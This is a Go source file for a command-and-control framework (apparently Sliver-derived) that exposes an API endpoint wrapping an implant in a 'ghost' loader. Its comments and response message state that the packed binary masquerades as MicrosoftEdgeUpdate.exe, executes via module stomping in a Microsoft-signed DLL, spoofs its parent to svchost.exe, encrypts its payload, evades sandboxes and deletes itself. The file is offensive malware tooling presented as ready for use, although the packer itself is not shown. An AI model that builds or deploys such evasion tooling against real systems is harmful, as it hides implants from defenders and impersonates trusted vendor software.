package web

/*
	SUDOSOC-C2 — /api/generate/ghost endpoint
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing and red team operations only.

	POST /api/generate/ghost
	  body:  { "binary_path": "/abs/path/to/implant.exe",
	           "implant_name": "myimplant",
	           "is_shellcode": false }
	  resp:  { "path": "…_ghost.exe", "message": "…" }

	The resulting binary:
	  • Appears as MicrosoftEdgeUpdate.exe (PE version resources)
	  • Executes via Module Stomping (MS-signed DLL .text section)
	  • PPID Spoofed to svchost.exe in process tree
	  • AES-256-GCM encrypted payload
	  • Anti-sandbox, heap-encryption during sleep, self-delete
*/

import (
	"encoding/json"
	"net/http"
	"path/filepath"
	"strings"

	"github.com/sudosoc/SUDOSOC-C2/server/assets"
	"github.com/sudosoc/SUDOSOC-C2/server/generate"
)

type ghostReq struct {
	BinaryPath  string `json:"binary_path"`
	ImplantName string `json:"implant_name"`
	IsShellcode bool   `json:"is_shellcode"`
}

type ghostResp struct {
	Path    string `json:"path"`
	Message string `json:"message"`
}

func handleGenerateGhost(w http.ResponseWriter, r *http.Request) {
	var req ghostReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.BinaryPath == "" {
		jsonError(w, "binary_path is required", http.StatusBadRequest)
		return
	}

	// Security: only allow files in the slivers dir or /tmp
	abs := filepath.Clean(req.BinaryPath)
	sliversDir := generate.GetSliversDir()
	if !strings.HasPrefix(abs, sliversDir) && !strings.HasPrefix(abs, "/tmp") {
		jsonError(w, "path not in allowed directories", http.StatusForbidden)
		return
	}

	name := req.ImplantName
	if name == "" {
		name = "implant"
	}

	appDir := assets.GetRootAppDir()
	packed, err := generate.GhostPack(abs, name, req.IsShellcode, appDir)
	if err != nil {
		jsonError(w, "ghost pack failed: "+err.Error(), http.StatusInternalServerError)
		return
	}

	_ = json.NewEncoder(w).Encode(ghostResp{
		Path: packed,
		Message: "Ghost loader ready — " +
			"Module Stomping (exec inside MS DLL) + " +
			"PPID Spoof (svchost parent) + " +
			"PE metadata: MicrosoftEdgeUpdate.exe",
	})
}
